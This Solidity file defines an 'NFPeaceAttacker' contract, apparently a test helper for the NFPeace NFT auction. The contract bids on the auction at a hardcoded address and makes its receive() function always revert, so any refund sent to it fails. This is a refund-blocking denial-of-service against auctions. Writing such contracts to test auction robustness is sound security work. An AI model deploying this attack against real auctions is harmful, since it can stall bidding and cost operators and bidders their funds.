// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "./NFPeace.sol";

contract NFPeaceAttacker {
    NFPeace private constant NFPEACE = NFPeace(0x0000000011E48D382b4F627437A2bBAc3b10F90e);

    receive () external payable {
        revert("Caught the NFT...");
    }

    /// @dev Enter a new bid
    /// @param auctionId The Auction ID to bid on
    function bid (uint64 auctionId) external payable {
        NFPEACE.bid{value: msg.value}(auctionId);
    }
}
